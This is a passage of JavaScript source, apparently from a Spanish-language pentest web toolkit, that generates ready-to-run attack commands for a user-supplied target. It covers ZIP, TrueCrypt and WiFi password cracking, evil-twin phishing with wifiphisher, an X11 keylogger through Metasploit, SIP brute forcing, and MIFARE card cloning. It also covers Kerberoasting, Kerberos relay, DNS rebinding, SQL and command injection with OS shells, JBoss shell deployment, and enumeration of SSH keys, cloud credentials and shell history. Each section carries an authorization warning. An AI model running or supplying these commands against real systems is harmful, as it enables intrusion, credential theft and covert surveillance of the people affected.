            fcrackzip: {n: 'fcrackzip', i: 'sudo apt install fcrackzip', c: ['fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt ' + target, 'fcrackzip -u -b -c a1 -l 1-6 ' + target]},
            cmospwd: {n: 'cmospwd', i: 'sudo apt install cmospwd', c: ['cmospwd']},
            crackle: {n: 'Crackle', i: 'sudo apt install crackle', c: ['crackle -i ' + target, 'crackle -i ' + target + ' -o output']},
            truecrack: {n: 'Truecrack', i: 'git clone https://github.com/lvaccaro/truecrack', c: ['truecrack -t ' + target + ' -w /usr/share/wordlists/rockyou.txt']}
        };
        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
        keys.forEach(function(k) {
            var t = allTools[k];
            if (!t) return;
            lines.push('[Tool] ' + t.n);
            lines.push('  Install: ' + t.i);
            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
            lines.push('');
        });
        lines.push('-'.repeat(50));
        lines.push('WARN: solo crackea hashes que te pertenezcan');
        setOutput('passcrackResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// UNSECURED CREDENTIALS
// ============================================================
function runUnsecuredCredentials() {
    var target = ($('unsecuredTarget') ? $('unsecuredTarget').value : '').trim() || '~/';
    var category = ($('unsecuredCategory') ? $('unsecuredCategory').value : 'all');
    setOutput('unsecuredResult', 'Enumerando credenciales...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  UNSECURED CREDENTIALS');
        lines.push('  Home: ' + esc(target));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('  Referencia: MITRE ATT&CK T1552');
        lines.push('');
        var categories = {
            ssh: {n: 'SSH Keys', paths: ['~/.ssh/id_rsa', '~/.ssh/id_ed25519', '~/.ssh/authorized_keys'], risk: 'Permisos 0644 en privadas'},
            cloud: {n: 'Cloud Credentials', paths: ['~/.aws/credentials', '~/.config/gcloud/credentials.db', '~/.kube/config'], risk: 'Acceso a produccion'},
            history: {n: 'Shell History', paths: ['~/.bash_history', '~/.zsh_history'], risk: 'Passwords en texto plano'},
            browser: {n: 'Browser', paths: ['~/.mozilla/firefox/*/logins.json', '~/.config/google-chrome/Default/Login Data'], risk: 'Passwords guardados'},
            keyring: {n: 'Keyring', paths: ['~/.local/share/keyrings/'], risk: 'Descifrado offline'},
            git: {n: 'Git', paths: ['~/.git-credentials', '~/.gitconfig'], risk: 'Tokens en texto plano'},
            tokens: {n: 'App Tokens', paths: ['~/.netrc', '~/.npmrc', '~/.config/gh/hosts.yml'], risk: 'Tokens de publicacion'}
        };
        var cats = (category === 'all') ? Object.keys(categories) : [category];
        cats.forEach(function(k) {
            var c = categories[k];
            if (!c) return;
            lines.push('[Tool] ' + c.n);
            lines.push('  Rutas:');
            c.paths.forEach(function(p) { lines.push('    ' + p); });
            lines.push('  WARN: ' + c.risk);
            lines.push('');
        });
        lines.push('Comandos:');
        lines.push(codeBlock('find ~/.ssh -name "id_*" -type f ! -name "*.pub" -perm /o+r'));
        lines.push(codeBlock('grep -iE "password|secret|token" ~/.bash_history'));
        lines.push(codeBlock('ls -la ~/.aws/ ~/.config/gcloud/ ~/.kube/ 2>/dev/null'));
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo enumera sistemas con autorizacion');
        setOutput('unsecuredResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// WIFI CREDENTIAL ACCESS
// ============================================================
function runWifiCredentialAccess() {
    var target = ($('wificredTarget') ? $('wificredTarget').value : '').trim();
    var tool = ($('wificredTool') ? $('wificredTool').value : 'all');
    if (!target) { setOutput('wificredResult', 'ERROR: ingresa un BSSID o ESSID'); return; }
    setOutput('wificredResult', 'Generando comandos...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  WIFI CREDENTIAL ACCESS');
        lines.push('  Target: ' + esc(target));
        lines.push('='.repeat(50));
        lines.push('');
        var allTools = {
            'aircrack-ng': {
                n: 'Aircrack-ng',
                i: 'sudo apt install aircrack-ng',
                c: [
                    'aircrack-ng -w /usr/share/wordlists/rockyou.txt -b ' + target + ' capture-01.cap',
                    'aircrack-ng -w wordlist.txt capture-01.cap'
                ]
            },
            'wifi-honey': {
                n: 'Wifi-honey',
                i: 'sudo apt install wifi-honey',
                c: ['wifi-honey ' + target + ' 6 wlan0']
            },
            wifiphisher: {
                n: 'Wifiphisher',
                i: 'sudo apt install wifiphisher',
                c: [
                    'sudo wifiphisher -e "' + target + '" -p firmware-upgrade',
                    'sudo wifiphisher --essid ' + target + ' -p plugin_update'
                ]
            },
            wifite: {
                n: 'Wifite',
                i: 'sudo apt install wifite',
                c: [
                    'sudo wifite --bssid ' + target,
                    'sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt',
                    'sudo wifite --pmkid'
                ]
            },
            airgeddon: {
                n: 'Airgeddon',
                i: 'git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git',
                c: [
                    'sudo bash ./airgeddon.sh',
                    '# Menu interactivo: seleccionar ataque'
                ]
            },
            bully: {
                n: 'Bully',
                i: 'sudo apt install bully pixiewps',
                c: [
                    'bully wlan0mon -b ' + target + ' -c 6 -d -v 3',
                    'bully wlan0mon -b ' + target + ' -c 6 -v 3'
                ]
            },
            'fern-wifi-cracker': {
                n: 'Fern WiFi Cracker',
                i: 'sudo apt install fern-wifi-cracker',
                c: [
                    'sudo fern-wifi-cracker',
                    '# GUI: Refresh -> Attack'
                ]
            },
            eapmd5pass: {
                n: 'eapmd5pass',
                i: 'sudo apt install eapmd5pass',
                c: [
                    'eapmd5pass -r capture.pcap -w /usr/share/wordlists/rockyou.txt',
                    'eapmd5pass -i wlan0 -w wordlist.txt'
                ]
            }
        };
        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
        keys.forEach(function(k) {
            var t = allTools[k];
            if (!t) return;
            lines.push('[Tool] ' + t.n);
            lines.push('  Install: ' + t.i);
            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
            lines.push('');
        });
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca redes con autorizacion escrita');
        setOutput('wificredResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// KEYLOGGER
// ============================================================
function runKeylogger() {
    var target = ($('keyloggerTarget') ? $('keyloggerTarget').value : '').trim();
    var port = ($('keyloggerPort') ? $('keyloggerPort').value : '').trim() || '6000';
    var timeout = ($('keyloggerTimeout') ? $('keyloggerTimeout').value : '').trim() || '600';
    if (!target) { setOutput('keyloggerResult', 'ERROR: ingresa una IP objetivo'); return; }
    setOutput('keyloggerResult', 'Generando comandos...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  KEYLOGGER (X11 Keyboard Spy)');
        lines.push('  Target: ' + esc(target));
        lines.push('  Puerto: ' + esc(port));
        lines.push('  Timeout: ' + esc(timeout) + ' s');
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] Xspy via Metasploit');
        lines.push('  Install: sudo apt install metasploit-framework');
        lines.push('');
        lines.push('[Step 1] Scan puerto X11');
        lines.push(codeBlock('msfconsole'));
        lines.push(codeBlock('use auxiliary/scanner/x11/open_x11'));
        lines.push(codeBlock('set rhosts ' + target));
        lines.push(codeBlock('run'));
        lines.push('');
        lines.push('[Step 2] Capturar teclado');
        lines.push(codeBlock('use auxiliary/gather/x11_keyboard_spy'));
        lines.push(codeBlock('set rhosts ' + target));
        lines.push(codeBlock('set rport ' + port));
        lines.push(codeBlock('set LISTENER_TIMEOUT ' + timeout));
        lines.push(codeBlock('run'));
        lines.push('');
        lines.push('[Notes]');
        lines.push('  - LISTENER_TIMEOUT 0 = permanente');
        lines.push('  - PRINTERVAL ajusta el intervalo de salida');
        lines.push('  - El target debe tener el puerto X11 abierto (6000 por defecto)');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo monitorea sistemas que te pertenezcan');
        setOutput('keyloggerResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// VOIP CREDENTIAL ACCESS
// ============================================================
function runVoipCredentialAccess() {
    var target = ($('voipTarget') ? $('voipTarget').value : '').trim();
    var user = ($('voipUser') ? $('voipUser').value : '').trim();
    var tool = ($('voipTool') ? $('voipTool').value : 'all');
    if (!target) { setOutput('voipResult', 'ERROR: ingresa una IP objetivo'); return; }
    setOutput('voipResult', 'Generando comandos...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  VOIP CREDENTIAL ACCESS');
        lines.push('  Target: ' + esc(target));
        lines.push('  Usuario: ' + (esc(user) || 'No especificado'));
        lines.push('='.repeat(50));
        lines.push('');
        var allTools = {
            svcrack: {
                n: 'SVCrack (SIPVicious)',
                i: 'sudo apt install sipvicious',
                c: [
                    'sipvicious_svcrack -u' + (user || '100') + ' -r1-9999 ' + target,
                    'sipvicious_svcrack -u' + (user || '100') + ' -d dictionary.txt ' + target
                ]
            },
            enumiax: {
                n: 'Enumiax',
                i: 'sudo apt install enumiax',
                c: [
                    'enumiax ' + target,
                    'enumiax ' + target + ' -p 4569',
                    'enumiax -v -o results.txt ' + target
                ]
            }
        };
        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
        keys.forEach(function(k) {
            var t = allTools[k];
            if (!t) return;
            lines.push('[Tool] ' + t.n);
            lines.push('  Install: ' + t.i);
            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
            lines.push('');
        });
        lines.push('[Flujo recomendado]');
        lines.push(codeBlock('sipvicious_svmap ' + target));
        lines.push(codeBlock('sipvicious_svwar -e100-999 ' + target));
        lines.push(codeBlock('sipvicious_svcrack -u' + (user || '100') + ' -r1-9999 ' + target));
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca sistemas VoIP con autorizacion');
        setOutput('voipResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// LIBNFC
// ============================================================
function runLibNFC() {
    var iface = ($('libnfcIface') ? $('libnfcIface').value : '').trim() || 'pn532_spi:/dev/spidev0.1:50000';
    var cmd = ($('libnfcCmd') ? $('libnfcCmd').value : 'list');
    setOutput('libnfcResult', 'Generando comandos LibNFC...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  LIBNFC COMMANDS');
        lines.push('  Interface: ' + esc(iface));
        lines.push('  Comando: ' + esc(cmd));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] LibNFC');
        lines.push('  Install: sudo apt install libnfc-bin libnfc-examples');
        lines.push('');
        lines.push('Configuracion (/etc/nfc/libnfc.conf):');
        lines.push(codeBlock('device.name = "PN532 via SPI"'));
        lines.push(codeBlock('device.connstring = "' + iface + '"'));
        lines.push('');
        if (cmd === 'list') {
            lines.push('Listar dispositivos NFC:');
            lines.push(codeBlock('nfc-list'));
            lines.push(codeBlock('nfc-list -v'));
            lines.push('');
        }
        if (cmd === 'poll') {
            lines.push('Polling de tarjetas:');
            lines.push(codeBlock('nfc-poll'));
            lines.push(codeBlock('nfc-poll -v'));
            lines.push('');
        }
        lines.push('[Notes]');
        lines.push('  - I2C: pn532_i2c:/dev/i2c-1');
        lines.push('  - UART: pn532_uart:/dev/ttyACM0');
        lines.push('  - SPI: pn532_spi:/dev/spidev0.1:50000');
        lines.push('  - Puede requerir sudo para acceder al dispositivo');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo lee tarjetas que te pertenezcan');
        setOutput('libnfcResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// NFC MIFARE CLASSIC
// ============================================================
function runNfcMfclassic() {
    var action = ($('mfAction') ? $('mfAction').value : 'r');
    var key = ($('mfKey') ? $('mfKey').value : 'a');
    var uid = ($('mfUid') ? $('mfUid').value : '').trim() || 'u';
    var dump = ($('mfDump') ? $('mfDump').value : '').trim() || 'dump.mfd';
    setOutput('mfResult', 'Generando comandos nfc-mfclassic...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  NFC-MFCLASSIC COMMANDS');
        lines.push('  Accion: ' + esc(action));
        lines.push('  Key: ' + esc(key));
        lines.push('  UID: ' + esc(uid));
        lines.push('  DUMP: ' + esc(dump));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] nfc-mfclassic');
        lines.push('  Install: sudo apt install libnfc-bin');
        lines.push('');
        lines.push('Sintaxis: nfc-mfclassic f|r|R|w|W a|A|b|B u|U<uid> DUMP [KEYS [f]]');
        lines.push('');
        lines.push('Comando generado:');
        lines.push(codeBlock('nfc-mfclassic ' + action + ' ' + key + ' ' + uid + ' ' + dump));
        lines.push('');
        lines.push('[Notes]');
        lines.push('  - r = read, w = write, R = unlocked read, W = unlocked write, f = format');
        lines.push('  - a/A = Key A, b/B = Key B (mayuscula = ignorar errores)');
        lines.push('  - u = UID default, U<hex> = UID especifico (ej: U01ab23cd)');
        lines.push('  - R/W solo funcionan en tarjetas MIFARE 1K chinas (clones)');
        lines.push('  - f resetea keys a FFFFFFFFFFFF y data a 00');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo lee/escribe tarjetas que te pertenezcan');
        setOutput('mfResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// KERBEROAST
// ============================================================
function runKerberoast() {
    var domain = ($('kerbDomain') ? $('kerbDomain').value : '').trim() || 'example.local';
    var user = ($('kerbUser') ? $('kerbUser').value : '').trim() || 'username';
    var pass = ($('kerbPass') ? $('kerbPass').value : '').trim();
    var dc = ($('kerbDc') ? $('kerbDc').value : '').trim() || '192.168.1.10';
    setOutput('kerbResult', 'Generando comandos Kerberoast...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  KERBEROASTING');
        lines.push('  Dominio: ' + esc(domain));
        lines.push('  Usuario: ' + esc(user));
        lines.push('  DC IP: ' + esc(dc));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] Impacket GetUserSPNs');
        lines.push('  Install: pip install impacket');
        if (pass.indexOf(':') !== -1) {
            lines.push('Con hash (LM:NT):');
            lines.push(codeBlock('impacket-GetUserSPNs -hashes ' + pass + ' ' + domain + '/' + user + ' -dc-ip ' + dc + ' -outputfile hashes.txt'));
        } else {
            lines.push('Con password:');
            lines.push(codeBlock('impacket-GetUserSPNs ' + domain + '/' + user + ':' + (pass || 'password') + ' -dc-ip ' + dc + ' -outputfile hashes.txt'));
        }
        lines.push('');
        lines.push('[Tool] NetExec (nxc)');
        lines.push('  Install: pip install netexec');
        lines.push(codeBlock('netexec ldap ' + dc + ' -u ' + user + ' -p ' + (pass || 'password') + ' --kerberoasting output.txt'));
        lines.push('');
        lines.push('Cracking:');
        lines.push(codeBlock('john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt'));
        lines.push(codeBlock('hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt'));
        lines.push('');
        lines.push('[Notes]');
        lines.push('  - RC4 hardening en 2026: cuentas AES-only fallan con /rc4');
        lines.push('  - Hashes validos: krb5tgs (13100), krb5tgs AES (19600/19700)');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca dominios con autorizacion escrita');
        setOutput('kerbResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// KRBRELAYX
// ============================================================
function runKrbRelayX() {
    var target = ($('krbRelayTarget') ? $('krbRelayTarget').value : '').trim() || 'smb://server:445';
    var iface = ($('krbRelayIface') ? $('krbRelayIface').value : '').trim() || '192.168.1.50';
    var loot = ($('krbRelayLoot') ? $('krbRelayLoot').value : '').trim() || './loot';
    var format = ($('krbRelayFormat') ? $('krbRelayFormat').value : 'ccache');
    setOutput('krbRelayResult', 'Generando comandos KrbRelayX...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  KRBRELAYX');
        lines.push('  Target: ' + esc(target));
        lines.push('  Interface: ' + esc(iface));
        lines.push('  Loot: ' + esc(loot));
        lines.push('  Formato: ' + esc(format));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] krbrelayx');
        lines.push('  Install: git clone https://github.com/dirkjanm/krbrelayx');
        lines.push('');
        lines.push('Kerberos relay (sin credenciales):');
        lines.push(codeBlock('krbrelayx.py -t ' + target + ' -ip ' + iface + ' -l ' + loot));
        lines.push('');
        lines.push('Kerberos relay sobre SMB con ADCS:');
        lines.push(codeBlock('krbrelayx.py -t ' + target + ' --adcs --template DomainController -v DC03$'));
        lines.push('');
        lines.push('Unconstrained delegation abuse:');
        lines.push(codeBlock('krbrelayx.py -t ' + target + ' -l ' + loot + ' -f ' + format));
        lines.push('');
        lines.push('[Notes]');
        lines.push('  - -t solo acepta HOSTNAMES (no IPs) para Kerberos');
        lines.push('  - -ip especifica la interfaz para los servidores SMB/HTTP');
        lines.push('  - -f ccache (Impacket) o kirbi (Mimikatz)');
        lines.push('  - -wh WPAD_HOST habilita ataque de proxy authentication');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca dominios con autorizacion escrita');
        setOutput('krbRelayResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// DNS REBIND
// ============================================================
function runDnsRebind() {
    var iface = ($('dnsrebindIface') ? $('dnsrebindIface').value : '').trim() || 'eth0';
    var domain = ($('dnsrebindDomain') ? $('dnsrebindDomain').value : '').trim() || 'kali.local';
    var targets = ($('dnsrebindTargets') ? $('dnsrebindTargets').value : '').trim() || '';
    setOutput('dnsrebindResult', 'Generando comandos DNS Rebind...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  DNS REBIND');
        lines.push('  Interface: ' + esc(iface));
        lines.push('  Dominio: ' + esc(domain));
        if (targets) lines.push('  Targets: ' + esc(targets));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] rebind');
        lines.push('  Install: sudo apt install rebind');
        lines.push('');
        lines.push('Comando basico:');
        lines.push(codeBlock('rebind -i ' + iface + ' -d ' + domain));
        if (targets) {
            lines.push('Con targets especificos:');
            lines.push(codeBlock('rebind -i ' + iface + ' -d ' + domain + ' -t ' + targets));
        }
        lines.push('');
        lines.push('Opciones utiles:');
        lines.push('  -u <user>      Basic Auth user [admin]');
        lines.push('  -a <pass>      Basic Auth password [admin]');
        lines.push('  -p <port>      Puerto target [80]');
        lines.push('  -c <port>      Puerto callback [81]');
        lines.push('  -n <time>      Intervalo callback (ms) [2000]');
        lines.push('');
        lines.push('[Tool] dns-rebind (alias)');
        lines.push(codeBlock('dns-rebind -h'));
        lines.push('');
        lines.push('[Notes]');
        lines.push('  - Requiere dominio registrado apuntando a tu IP');
        lines.push('  - Ataca routers con weak end system model');
        lines.push('  - Abre DNS (53), Web (80) y Callback (81)');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca redes con autorizacion escrita');
        setOutput('dnsrebindResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// SQLMAP
// ============================================================
function runSqlmap() {
    var target = ($('sqlmapTarget') ? $('sqlmapTarget').value : '').trim();
    var data = ($('sqlmapData') ? $('sqlmapData').value : '').trim();
    var cookie = ($('sqlmapCookie') ? $('sqlmapCookie').value : '').trim();
    if (!target) { setOutput('sqlmapResult', 'ERROR: ingresa una URL'); return; }
    setOutput('sqlmapResult', 'Generando comandos SQLMap...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  SQLMAP');
        lines.push('  Target: ' + esc(target));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] SQLMap');
        lines.push('  Install: sudo apt install sqlmap');
        lines.push('');
        lines.push('Deteccion basica:');
        var cmd = 'sqlmap -u "' + target + '" --batch';
        if (data) cmd += ' --data="' + data + '"';
        if (cookie) cmd += ' --cookie="' + cookie + '"';
        lines.push(codeBlock(cmd));
        lines.push('');
        lines.push('Enumerar bases de datos:');
        lines.push(codeBlock(cmd + ' --dbs'));
        lines.push('');
        lines.push('Enumerar tablas de una DB:');
        lines.push(codeBlock(cmd + ' -D <dbname> --tables'));
        lines.push('');
        lines.push('Dump de datos:');
        lines.push(codeBlock(cmd + ' -D <dbname> -T <table> --dump'));
        lines.push('');
        lines.push('[Notes]');
        lines.push('  - Requiere autorizacion escrita para usar en produccion');
        lines.push('  - Usar con Burp Suite o proxy para inspeccionar');
        lines.push('  - --level=5 --risk=3 para pruebas exhaustivas');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca sistemas con autorizacion escrita');
        setOutput('sqlmapResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// SQLNINJA
// ============================================================
function runSqlninja() {
    var target = ($('sqlninjaTarget') ? $('sqlninjaTarget').value : '').trim() || '192.168.1.51:80';
    var mode = ($('sqlninjaMode') ? $('sqlninjaMode').value : 't');
    var config = ($('sqlninjaConfig') ? $('sqlninjaConfig').value : '').trim() || 'sqlninja.conf';
    setOutput('sqlninjaResult', 'Generando comandos SQLNinja...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  SQLNINJA');
        lines.push('  Target: ' + esc(target));
        lines.push('  Modo: ' + esc(mode));
        lines.push('  Config: ' + esc(config));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] sqlninja');
        lines.push('  Install: sudo apt install sqlninja');
        lines.push('');
        lines.push('Comando generado:');
        lines.push(codeBlock('sqlninja -m ' + mode + ' -f ' + config));
        lines.push('');
        lines.push('Modos disponibles:');
        lines.push('  t/test        Probar si la inyeccion funciona');
        lines.push('  f/fingerprint Fingerprint user, xp_cmdshell');
        lines.push('  b/bruteforce  Bruteforce cuenta sa');
        lines.push('  e/escalation  Agregar user a sysadmin');
        lines.push('  x/resurrectxp Recrear xp_cmdshell');
        lines.push('  u/upload      Subir .scr file');
        lines.push('  s/dirshell    Shell directo');
        lines.push('  r/revshell    Reverse shell');
        lines.push('  d/dnstunnel   Tunel DNS');
        lines.push('  m/metasploit  Wrapper a MSF');
        lines.push('');
        lines.push('[Notes]');
        lines.push('  - Especializado en Microsoft SQL Server');
        lines.push('  - La configuracion se hace en sqlninja.conf');
        lines.push('  - Usa Burp Suite para capturar el request HTTP');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca sistemas con autorizacion escrita');
        setOutput('sqlninjaResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// SQLSUS
// ============================================================
function runSqlsus() {
    var target = ($('sqlsusTarget') ? $('sqlsusTarget').value : '').trim() || 'http://ejemplo.com/page.php?id=1';
    var config = ($('sqlsusConfig') ? $('sqlsusConfig').value : '').trim() || 'target.cfg';
    var cmd = ($('sqlsusCmd') ? $('sqlsusCmd').value : '').trim();
    setOutput('sqlsusResult', 'Generando comandos SQLSus...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  SQLSUS');
        lines.push('  Target: ' + esc(target));
        lines.push('  Config: ' + esc(config));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] sqlsus');
        lines.push('  Install: sudo apt install sqlsus');
        lines.push('');
        lines.push('Paso 1: Generar configuracion:');
        lines.push(codeBlock('sqlsus --genconf ' + config));
        lines.push('');
        lines.push('Paso 2: Editar configuracion:');
        lines.push('  # Editar ' + config + ' con target y parametros de inyeccion');
        lines.push('');
        lines.push('Paso 3: Ejecutar:');
        if (cmd) {
            lines.push(codeBlock('sqlsus ' + config + ' -e \'' + cmd + '\''));
        } else {
            lines.push(codeBlock('sqlsus ' + config));
            lines.push('  # Luego dentro del shell interactivo:');
            lines.push('  start');
            lines.push('  get tables');
            lines.push('  get columns');
            lines.push('  clone');
        }
        lines.push('');
        lines.push('[Notes]');
        lines.push('  - Especializado en MySQL');
        lines.push('  - Usa SQLite como backend');
        lines.push('  - Inline help: escribe "help" en el shell');
        lines.push('  - Usa Ctrl-C para romper comandos largos');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca sistemas con autorizacion escrita');
        setOutput('sqlsusResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// jSQL Injection
// ============================================================
function runJsqlInjection() {
    var target = ($('jsqlTarget') ? $('jsqlTarget').value : '').trim() || 'http://target.com/item.php?id=1';
    var data = ($('jsqlData') ? $('jsqlData').value : '').trim();
    var headless = ($('jsqlHeadless') ? $('jsqlHeadless').checked : true);
    setOutput('jsqlResult', 'Generando comandos jSQL Injection...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  JSQL INJECTION');
        lines.push('  Target: ' + esc(target));
        lines.push('  Headless: ' + (headless ? 'Si' : 'No'));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] jSQL Injection');
        lines.push('  Install: sudo apt install jsql-injection');
        lines.push('  O: java -jar jsql-injection.jar');
        lines.push('');
        if (headless) {
            lines.push('Deteccion headless:');
            var cmd = 'java -jar jsql-injection.jar --url "' + target + '" --headless';
            if (data) cmd += ' --method=POST --data="' + data + '"';
            lines.push(codeBlock(cmd));
            lines.push('');
            lines.push('Enumerar databases:');
            lines.push(codeBlock(cmd + ' --strategy=union'));
            lines.push('');
            lines.push('Dump de tabla:');
            lines.push(codeBlock(cmd + ' --strategy=union --output=./dump.json'));
        } else {
            lines.push('Modo GUI:');
            lines.push(codeBlock('jsql-injection'));
        }
        lines.push('');
        lines.push('[Notes]');
        lines.push('  - Soporta 33 motores de DB');
        lines.push('  - Estrategias: Normal, Stacked, Error, Blind, Time');
        lines.push('  - Puede leer/escribir archivos via inyeccion');
        lines.push('  - Busca admin pages automaticamente');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca sistemas con autorizacion escrita');
        setOutput('jsqlResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// COMMIX
// ============================================================
function runCommix() {
    var target = ($('commixTarget') ? $('commixTarget').value : '').trim() || 'http://target.com/ping?ip=127.0.0.1';
    var data = ($('commixData') ? $('commixData').value : '').trim();
    var level = ($('commixLevel') ? $('commixLevel').value : '1');
    setOutput('commixResult', 'Generando comandos Commix...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  COMMIX');
        lines.push('  Target: ' + esc(target));
        lines.push('  Level: ' + esc(level));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] Commix');
        lines.push('  Install: sudo apt install commix');
        lines.push('');
        lines.push('Deteccion basica:');
        var cmd = 'commix --url="' + target + '"';
        if (data) cmd += ' --data="' + data + '"';
        lines.push(codeBlock(cmd));
        lines.push('');
        lines.push('Con nivel especifico:');
        lines.push(codeBlock(cmd + ' --level=' + level));
        lines.push('');
        lines.push('OS shell interactivo:');
        lines.push(codeBlock(cmd + ' --os-shell'));
        lines.push('');
        lines.push('Ejecutar comando unico:');
        lines.push(codeBlock(cmd + ' --os-cmd="whoami"'));
        lines.push('');
        lines.push('[Notes]');
        lines.push('  - Detecta command injection en GET, POST, headers');
        lines.push('  - Tecnicas: classic, timebased, file-based, semi-blind');
        lines.push('  - Usa --tamper para bypass de WAF');
        lines.push('  - -r request.txt para usar request de Burp');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca sistemas con autorizacion escrita');
        setOutput('commixResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// JBOSS LINUX
// ============================================================
function runJbossLinux() {
    var target = ($('jbosswinTarget') ? $('jbosswinTarget').value : '').trim() || '192.168.1.200';
    var port = ($('jbosswinPort') ? $('jbosswinPort').value : '').trim() || '8080';
    setOutput('jbosswinResult', 'Generando comandos JBoss Linux...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  JBOSS LINUX');
        lines.push('  Target: ' + esc(target));
        lines.push('  Puerto: ' + esc(port));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] jboss-autopwn');
        lines.push('  Install: sudo apt install jboss-autopwn');
        lines.push('');
        lines.push('Comando (jboss-linux):');
        lines.push(codeBlock('jboss-linux ' + target + ' ' + port + ' 2> /dev/null'));
        lines.push('');
        lines.push('[Notes]');
        lines.push('  - Deploya JSP shell en servidor JBoss AS');
        lines.push('  - Dependencias: curl, metasploit-framework');
        lines.push('  - Redirige stderr con 2> /dev/null');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca sistemas con autorizacion escrita');
        setOutput('jbosswinResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// JBOSS AUTOPWN
// ============================================================
function runJbossAutopwn() {
    var target = ($('jbossTarget') ? $('jbossTarget').value : '').trim() || '192.168.1.200';
    var port = ($('jbossPort') ? $('jbossPort').value : '').trim() || '8080';
    var os = ($('jbossOs') ? $('jbossOs').value : 'linux');
    setOutput('jbossResult', 'Generando comandos JBoss AutoPwn...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  JBOSS AUTOPWN');
        lines.push('  Target: ' + esc(target));
        lines.push('  Puerto: ' + esc(port));
        lines.push('  OS: ' + esc(os));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] jboss-autopwn');
        lines.push('  Install: sudo apt install jboss-autopwn');
        lines.push('');
        if (os === 'linux') {
            lines.push('Comando (Linux bind/reverse shell):');
            lines.push(codeBlock('./e.sh ' + target + ' ' + port));
            lines.push('');
            lines.push('Alternativa directa:');
            lines.push(codeBlock('jboss-linux ' + target + ' ' + port + ' 2> /dev/null'));
        } else {
            lines.push('Comando (Windows payloads):');
            lines.push(codeBlock('./e2.sh ' + target + ' ' + port));
            lines.push('');
            lines.push('Alternativa directa:');
            lines.push(codeBlock('jboss-win ' + target + ' ' + port + ' 2> /dev/null'));
        }
        lines.push('');
        lines.push('[Notes]');
        lines.push('  - e.sh para *nix targets (bind_tcp, reverse_tcp)');
